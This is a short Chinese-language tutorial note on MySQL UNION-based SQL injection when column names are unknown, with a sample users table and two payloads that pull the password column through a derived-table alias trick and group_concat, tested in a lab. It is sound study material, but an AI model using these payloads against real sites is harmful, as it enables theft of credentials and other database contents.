## 在无法得到列名下进行注入 ##
- - -
从这篇文章学习的：[如何在不知道MySQL列名的情况下注入出数据？\|NOSEC安全讯息平台 - NOSEC.ORG](https://nosec.org/home/detail/2245.html)

此方法适用于以下：
```
盲注的时候跑不出列名
```

利用条件：
```
知道列名的个数
```

mysql命令行测试：
```
表名为：users
users表里面的列名有：id,username,password
列的个数为3 (1,2,3) (1=>id,2=>username,3=>password)
```

查询语句为：
```mysql
select * from users where id=1
```

payload：
```mysql
union select 1,(select `2` from (select 1,2,3 union select * from users)a limit 1,1),3
```
结果：
![kDA439.png](https://s2.ax1x.com/2019/02/14/kDA439.png)

靶场测试：
![kDAIj1.png](https://s2.ax1x.com/2019/02/14/kDAIj1.png)

查询全部payload:
```mysql
union select 1,(select group_concat(`2`) from (select 1,2,3 union select * from users)a),3
```
![](https://s2.ax1x.com/2019/02/14/kDuV8U.png)

![kDuZ2F.md.png](https://s2.ax1x.com/2019/02/14/kDuZ2F.md.png)